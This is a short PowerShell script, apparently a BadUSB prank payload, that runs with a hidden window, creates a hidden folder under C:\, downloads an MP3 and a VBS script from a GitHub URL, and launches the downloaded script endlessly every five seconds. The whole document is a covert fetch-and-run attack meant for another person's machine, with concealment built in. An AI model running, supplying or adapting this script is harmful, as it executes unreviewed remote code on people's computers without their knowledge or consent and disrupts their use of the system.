Powershell.exe -windowstyle hidden {
    cd C:\
    mkdir RickRoll
    attrib +H RickRoll
    cd RickRoll
    Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/ContinuousRickRoll/RickRoll.mp3 -OutFile .\RickRoll.mp3
    Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/ContinuousRickRoll/Play.vbs -OutFile .\Play.vbs
    while ($true) {
        start Play.vbs
        Start-Sleep -Seconds 5
    }
}
